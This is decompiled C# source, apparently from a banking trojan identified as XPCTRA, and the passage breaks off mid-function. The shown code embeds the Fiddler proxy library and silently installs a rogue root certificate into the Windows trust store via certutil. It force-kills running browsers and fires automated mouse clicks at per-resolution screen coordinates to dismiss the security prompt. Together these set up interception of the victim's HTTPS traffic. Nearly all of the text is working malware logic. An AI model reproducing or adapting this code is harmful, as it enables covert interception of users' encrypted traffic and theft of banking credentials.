// Decompiled with JetBrains decompiler
// Type: Xpctra.APRECO518NECROLOGISTA
// Assembly: madre, Version=1.1.2.3, Culture=neutral, PublicKeyToken=null
// MVID: E3E81F5F-5E79-4C7B-AA1D-713B5D376685
// Assembly location: C:\Users\Marcos Abreu\Documents\XPCTRA\idfptray.exe

using Fiddler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;

namespace Xpctra
{
  internal class APRECO518NECROLOGISTA
  {
    private static int iSecureEndpointPort = 7777;
    private static string sSecureEndpointHostname = "localhost";
    private List<Session> oAllSessions = new List<Session>();
    private MANTO562VERDURA INSULAMENTO56PICA = new MANTO562VERDURA();
    private List<APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO> ListaDehttps = new List<APRECO518NECROLOGISTA.MAQUILADOR655PROSCRITO>();
    private List<string> INSULTANTE745ASTIGMATICO = new List<string>();
    private string PESCADOR327ORIGEM = Dns.GetHostName();
    private string Usuario = Environment.UserName;
    private object COMIGO542FORNALHA = new object();
    private object SemafaroDeLeitura = new object();
    private object DESTRUTIVEL345TIMIDEZ = new object();
    private bool BBAberto = false;
    private object Semafaro = new object();
    private bool CASTANHADOPARA374BE = false;
    private object ERUDICAO523ABOBAR = new object();
    private bool INCONTAVEL305CHOP = false;
    private object DESPUDORADO416ENSIMESMARSE = new object();
    private bool ARGELINO140CORROIDO = false;
    private object BRASILIENSE293IMPORTUNADO = new object();
    private bool COMEMORATIVO292CHOQUE = false;
    private object DESENCANTAMENTO952POLIINSATURADO = new object();
    private static Proxy oSecureEndpoint;

    [DllImport("user32.dll")]
    private static extern bool SetCursorPos(int X, int Y);

    [DllImport("user32.dll")]
    private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, UIntPtr dwExtraInfo);

    private void DOLAR167SAGRACAO()
    {
      string[] strArray = new string[3]
      {
        "firefox",
        "chrome",
        "iexplorer"
      };
      foreach (Process process1 in Process.GetProcesses())
      {
        if (((IEnumerable<string>) strArray).Contains<string>(process1.ProcessName))
        {
          ProcessStartInfo processStartInfo = new ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");
          Process process2 = new Process();
          processStartInfo.CreateNoWindow = true;
          processStartInfo.UseShellExecute = false;
          process2.StartInfo = processStartInfo;
          process2.StartInfo.RedirectStandardOutput = true;
          process2.StartInfo.RedirectStandardInput = true;
          process2.StartInfo.RedirectStandardError = true;
          process2.StartInfo = processStartInfo;
          process2.Start();
          process2.StandardInput.WriteLine("taskkill  /f /im " + process1.ProcessName + ".exe");
          process2.StandardInput.WriteLine("taskkill  /f /im " + process1.ProcessName + ".exe");
          process2.Close();
          process2.Dispose();
        }
      }
    }

    public void Intallcertificado2()
    {
      if (!CertMaker.rootCertExists())
      {
        try
        {
          Xpctra.Properties.Settings.Default.CaminhoPath = AppDomain.CurrentDomain.BaseDirectory.ToString();
          CertMaker.createRootCert();
          Thread.Sleep(2000);
          System.IO.File.WriteAllBytes(Xpctra.Properties.Settings.Default.CaminhoPath + "FiddlerRoot.cer", CertMaker.GetRootCertificate().Export(X509ContentType.Cert));
          Thread.Sleep(2000);
          string str = "certutil -addstore \"Root\" " + Xpctra.Properties.Settings.Default.CaminhoPath + "FiddlerRoot.cer";
          ProcessStartInfo processStartInfo = new ProcessStartInfo("C:\\Windows\\System32\\cmd.exe");
          Process process = new Process();
          processStartInfo.CreateNoWindow = true;
          processStartInfo.UseShellExecute = false;
          process.StartInfo = processStartInfo;
          process.StartInfo.RedirectStandardOutput = true;
          process.StartInfo.RedirectStandardInput = true;
          process.StartInfo.RedirectStandardError = true;
          process.StartInfo = processStartInfo;
          process.StartInfo.Verb = "runas";
          process.Start();
          process.StandardInput.WriteLine(str);
          process.Close();
          process.Dispose();
          Thread.Sleep(2000);
          this.StartaFiddler();
          Xpctra.Properties.Settings.Default.CertificadoInstalado = true;
          this.DOLAR167SAGRACAO();
        }
        catch (Exception ex)
        {
          Xpctra.Properties.Settings.Default.CertificadoInstalado = false;
          this.InstallCertificado();
          Thread.Sleep(1000);
          if (Xpctra.Properties.Settings.Default.CertificadoInstalado)
            return;
          Xpctra.Properties.Settings.Default.Excption = ex.Message;
        }
      }
      else
      {
        this.StartaFiddler();
        Xpctra.Properties.Settings.Default.CertificadoInstalado = true;
      }
    }

    public void InstallCertificado()
    {
      int width = Screen.PrimaryScreen.Bounds.Width;
      int height = Screen.PrimaryScreen.Bounds.Height;
      this.DOLAR167SAGRACAO();
      if (width == 1366 && height == 768)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(100);
        int X = 772;
        int Y = 590;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1364 && height == 768)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        int X = 781;
        int Y = 580;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1920 && height == 1080)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        int X = 1048;
        int Y = 746;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1680 && height == 1050)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 925;
        int Y = 730;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1600 && height == 900)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 885;
        int Y = 655;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1440 && height == 900)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 808;
        int Y = 658;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1400 && height == 1050)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 791;
        int Y = 729;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
      }
      if (width == 1360 && height == 768)
      {
        new Thread(new ThreadStart(this.Certificado)).Start();
        Thread.Sleep(300);
        int X = 779;
        int Y = 587;
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
        APRECO518NECROLOGISTA.mouse_event(2U, 0U, 0U, 0U, UIntPtr.Zero);
        APRECO518NECROLOGISTA.mouse_event(4U, 0U, 0U, 0U, UIntPtr.Zero);
        Thread.Sleep(100);
        APRECO518NECROLOGISTA.SetCursorPos(X, Y);
